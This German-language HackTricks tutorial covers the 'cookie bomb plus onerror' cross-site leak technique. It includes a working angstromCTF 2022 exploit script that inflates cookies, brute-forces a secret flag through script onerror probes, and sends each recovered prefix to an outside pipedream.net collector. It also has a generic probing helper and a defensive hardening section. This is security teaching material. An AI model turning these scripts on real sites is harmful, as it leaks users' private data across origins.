# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Diese Technik kombiniert:
- Cookie bombing: das Füllen des Browsers des Opfers mit vielen/großen Cookies für die Ziel-Origins, sodass nachfolgende Requests Server-/Anforderungsgrenzen erreichen (Größe der Request-Header, URL-Länge bei Redirects usw.).
- Error-event oracle: Ausfragen eines Cross-Origin-Endpunkts mit einem <script> (oder anderem subresource) und Unterscheiden der Zustände mittels onload vs onerror.

High level idea
- Finde einen Ziel-Endpunkt, dessen Verhalten sich für zwei zu testende Zustände unterscheidet (z. B. Suche “hit” vs “miss”).
- Stelle sicher, dass der “hit”-Pfad eine starke Redirect-Kette oder eine lange URL auslöst, während der “miss”-Pfad kurz bleibt. Blähe Request-Header mit vielen Cookies auf, sodass nur der “hit”-Pfad dazu führt, dass der Server mit einem HTTP-Fehler (z. B. 431/414/400) fehlschlägt. Der Fehler kippt das onerror-Event und wird so zu einer Oracle für XS-Search.

Wann funktioniert das
- Du kannst den Browser des Opfers dazu bringen, Cookies an das Ziel zu senden (z. B. sind die Cookies SameSite=None oder du kannst sie in einem First-Party-Kontext via window.open setzen).
- Es gibt eine App-Funktion, die du missbrauchen kannst, um beliebige Cookies zu setzen (z. B. “save preference”-Endpunkte, die kontrollierte Eingaben in Set-Cookie verwandeln) oder um Post-Auth-Redirects zu erzeugen, die vom Angreifer kontrollierte Daten in die URL einbauen.
- Der Server reagiert in den beiden Zuständen unterschiedlich und bei aufgeblähten Headern/URL überschreitet ein Zustand ein Limit und liefert eine Fehlerantwort, die onerror auslöst.

Note on server errors used as the oracle
- 431 Request Header Fields Too Large wird häufig zurückgegeben, wenn Cookies Request-Header aufblähen; 414 URI Too Long oder ein server-spezifisches 400 können für lange Request-Ziele zurückgegeben werden. Alle diese führen zu einem fehlgeschlagenen subresource-Load und lösen onerror aus. [MDN documents 431 and typical causes like excessive cookies.]()

Practical example (angstromCTF 2022)
Das folgende Script (aus einem öffentlichen Writeup) missbraucht eine Funktion, die es dem Angreifer erlaubt, beliebige Cookies einzufügen, und lädt dann einen cross-origin search-endpunkt als Script. Wenn die Query korrekt ist, führt der Server einen Redirect aus, der zusammen mit der Cookie-Aufblähung die Serverlimits überschreitet und einen Fehlerstatus zurückgibt, sodass script.onerror ausgelöst wird; andernfalls passiert nichts.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
Warum das Popup (window.open)?
- Moderne Browser blockieren zunehmend Drittanbieter-Cookies. Das Öffnen eines Top-Level-Fensters zum Ziel macht Cookies zu First‑Party, sodass Set-Cookie-Antworten vom Ziel haften bleiben und der cookie-bomb Schritt selbst bei Einschränkungen für Drittanbieter-Cookies möglich wird.

Generic probing helper
Wenn Sie bereits eine Möglichkeit haben, viele Cookies auf der Ziel-Origin (Erstanbieter) zu setzen, können Sie dieses minimale Oracle gegen jeden Endpoint wiederverwenden, dessen Erfolg/Fehlschlag zu unterschiedlichen Netzwerk-Ergebnissen (Status/MIME/Redirect) führt:
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Tipps zum Aufbau des Orakels
- Zwinge den „positiven“ Zustand schwerer: hänge eine zusätzliche Weiterleitung nur dann an, wenn das Prädikat wahr ist, oder lasse die Redirect-URL ungebundene Benutzereingaben widerspiegeln, sodass sie mit dem geratenen Präfix wächst.
- Header aufblasen: wiederhole cookie bombing, bis auf dem „schweren“ Pfad ein konsistenter Fehler beobachtet wird. Server begrenzen üblicherweise die Header-Größe und schlagen früher fehl, wenn viele Cookies vorhanden sind.
- Stabilisieren: führe mehrere parallele Set-Cookie-Operationen aus und probe wiederholt, um Timing- und Caching-Rauschen zu mitteln.

Verwandte XS-Search-Tricks
- URL-längenbasierte Orakel (keine Cookies nötig) können kombiniert oder stattdessen verwendet werden, wenn du ein sehr langes Anfrageziel erzwingen kannst:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Abwehrmaßnahmen und Härtung
- Mache Erfolgs-/Fehler-Antworten nicht unterscheidbar:
- Vermeide bedingte Weiterleitungen oder große Unterschiede in der Antwortgröße zwischen Zuständen. Gib denselben Status, denselben Content-Type und eine ähnliche Body-Länge unabhängig vom Zustand zurück.
- Blockiere cross-site Subresource-Probes:
- SameSite-Cookies: Setze sensitive Cookies auf SameSite=Lax oder Strict, damit Subresource-Anfragen wie <script src> diese nicht mitsenden; bevorzuge Strict für Auth-Tokens, wenn möglich.
- Fetch Metadata: Erzwinge eine Resource Isolation Policy, um cross-site Subresource-Loads abzulehnen (z. B. wenn Sec-Fetch-Site != same-origin/same-site).
- Cross-Origin-Resource-Policy (CORP): Setze CORP: same-origin (oder mindestens same-site) für Endpunkte, die nicht als cross-origin Subresources eingebettet werden sollen.
- X-Content-Type-Options: nosniff und korrekter Content-Type für JSON/HTML-Endpunkte, um Load-as-script-Quirks zu vermeiden.
- Reduziere Header-/URL-Amplifikation:
- Begrenze Anzahl/Größe gesetzter Cookies; saniere Features, die beliebige Formularfelder in Set-Cookie verwandeln.
- Normalisiere oder kürze reflektierte Daten in Redirects; vermeide das Einbetten angreiferkontrollierter langer Strings in Location-URLs.
- Halte Server-Limits konsistent und lasse sie einheitlich fehlschlagen (vermeide spezielle Fehlerseiten nur für einen Zweig).

Hinweise
- Diese Angriffsklasse wird allgemein als „Error Events“ XS-Leaks diskutiert. Der cookie-bomb-Schritt ist nur ein praktischer Weg, um nur einen Zweig über Server-Limits zu drücken und so ein zuverlässiges boolesches Orakel zu erzeugen.



## Referenzen
- XS-Leaks: Error Events (onerror/onload als Orakel): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (häufig bei vielen Cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
{{#include ../../banners/hacktricks-training.md}}
